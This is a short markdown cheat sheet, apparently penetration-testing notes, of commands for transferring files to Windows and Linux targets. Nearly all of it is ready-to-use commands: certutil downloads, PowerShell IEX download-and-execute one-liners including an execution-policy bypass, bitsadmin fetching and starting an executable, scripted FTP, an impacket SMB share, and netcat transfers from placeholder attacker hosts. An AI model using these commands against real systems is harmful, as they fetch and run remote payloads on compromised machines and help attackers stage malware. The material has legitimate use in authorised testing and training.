## Windows

### CertUtil.exe
```powershell
certutil -urlcache -split -f "http://ip-addr:port/NameOfHostedFile" <output-file-name>
```


### Powershell
```powershell
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')

download and execute
powershell IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')

powershellv2
download and execute
powershell -Version 2 -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')

powershellv3
download and execute
wget "http://<ip address>:<port>/FileToDownload.exe" -OutFile SomeOutputFileName.exe
```


### BITS Admin 
```powershell
cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://<ip address>:<port>/FileToTransfer.exe C:\Path\ExeOutputName.exe
start ExeOutputName.exe"
```

### FTP
```powershell
LHOST:
python -m pyftpdlib -p 21 -w
w- for anonymous write permissions

echo open ip-addr > ftp.txt
echo username >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```


### SMB
```powershell
LHOST:
python /usr/share/doc/python-impacket/examples/smbserver.py share-name root-dir

RHOST:
copy \\ip-addr\share-name\file out-file
```

## Linux

### Netcat
```bash
echo "GET /file HTTP/1.0" | nc -n ip-addr port > out-file && sed -i '1,7d' out-file
```

### Python
```bash
#!/usr/bin/python import urllib2 u = urllib2.urlopen('https://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close()
```

### PHP
```bash
#!/usr/bin/php 
<?php         
$data = @file("https://example.com/file");         
$lf = "local_file";         
$fh = fopen($lf, 'w');         
fwrite($fh, $data[0]);         
fclose($fh); 
?>
```

### Netcat
```bash
LHOST:
cat file | nc -l 1234

RHOST:
nc host_ip 1234 > file
```

